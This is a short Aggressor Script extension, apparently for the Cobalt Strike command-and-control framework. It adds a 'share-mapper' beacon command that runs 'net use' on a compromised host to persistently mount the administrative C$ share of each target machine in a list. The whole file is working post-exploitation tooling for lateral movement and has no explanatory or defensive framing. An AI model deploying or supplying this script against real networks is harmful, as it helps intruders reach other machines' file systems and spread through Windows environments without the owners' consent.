#no desc

beacon_command_register("share-mapper", "shares attacher",
    "Syntax: share-mapper [hostname1,hostname2,hostname3,hostname4]");

alias share-mapper {
    if ($2 is $null) {
        berror($1, "Need hosts!");
    } else {
        @hsts = split(",", ["$2" trim]);
        foreach $entry (@hsts) {
            blog2($1, "Attaching c\$ in $entry host");
            bshell($1, "net use * \\\\$entry\\c\$ /PERSISTENT:YES");
        }
        bshell($1, "net use");
    }
}
